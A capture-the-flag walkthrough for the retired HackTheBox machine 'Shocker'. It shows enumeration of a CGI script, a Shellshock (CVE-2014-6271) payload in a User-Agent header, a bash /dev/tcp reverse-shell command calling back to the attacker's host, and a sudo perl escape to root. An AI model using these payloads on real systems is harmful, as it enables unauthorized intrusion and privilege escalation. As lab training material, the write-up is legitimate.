# HackTheBox — Shocker

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / Shellshock  
**Status:** Retired  

---

## Summary

Shocker is a Linux machine named after the **Shellshock** vulnerability (CVE-2014-6271). The box hosts an Apache server with a CGI script that is vulnerable to Bash environment variable injection, allowing unauthenticated RCE. Privilege escalation is trivial via a sudo rule for `perl`.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/shocker 10.10.10.56
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18
2222/tcp open  ssh     OpenSSH 7.2p2
```

---

## Web Enumeration

### Gobuster — Root Directory

```bash
gobuster dir -u http://10.10.10.56/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The root returns mostly 404s and a default Apache page. The key is finding the `/cgi-bin/` directory:

```
/cgi-bin/   (Status: 403)
```

### Gobuster — CGI Scripts

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,cgi,pl,py
```

```
/user.sh   (Status: 200)
```

### Testing the CGI Script

```bash
curl http://10.10.10.56/cgi-bin/user.sh
```

```
Content-Type: text/plain
Just an uptime test script

 18:23:45 up  1:01,  0 users,  load average: 0.00, 0.00, 0.00
```

This is a Bash CGI script — an ideal Shellshock target.

---

## Exploitation

### CVE-2014-6271 — Shellshock

Shellshock allows attackers to inject commands via Bash's handling of environment variables. When a CGI script is executed by Bash, HTTP headers like `User-Agent` or `Referer` are passed as environment variables.

**Test for vulnerability:**

```bash
curl -H "User-Agent: () { :; }; echo; echo VULNERABLE" \
  http://10.10.10.56/cgi-bin/user.sh
```

If `VULNERABLE` appears in the response — it's confirmed.

**Reverse Shell:**

```bash
# Start listener
nc -lvnp 4444

# Exploit
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.X/4444 0>&1" \
  http://10.10.10.56/cgi-bin/user.sh
```

Shell lands as **shelly**.

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

### GTFOBins — perl sudo escape

```bash
sudo perl -e 'exec "/bin/sh";'
```

**Root shell obtained.**

---

## Flags

```bash
cat /home/shelly/user.txt
cat /root/root.txt
```

---

## Key Takeaways

- **Shellshock is still relevant** — always test CGI scripts on older Apache servers
- When gobuster finds `403` on `/cgi-bin/`, enumerate for scripts inside it (`.sh`, `.cgi`, `.pl`)
- HTTP headers like `User-Agent`, `Referer`, and `Cookie` are all potential Shellshock injection vectors
- **GTFOBins** is essential — many interpreted languages (perl, python, ruby) can escape sudo restrictions
- `sudo -l` should be one of the very first privesc checks

---

## CVE Reference

- **CVE-2014-6271** — GNU Bash Remote Code Execution (Shellshock)
- **CVE-2014-7169** — Related Shellshock bypass

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web & CGI enumeration |
| curl | Shellshock exploitation |
| netcat | Reverse shell listener |
| GTFOBins | Privilege escalation reference |
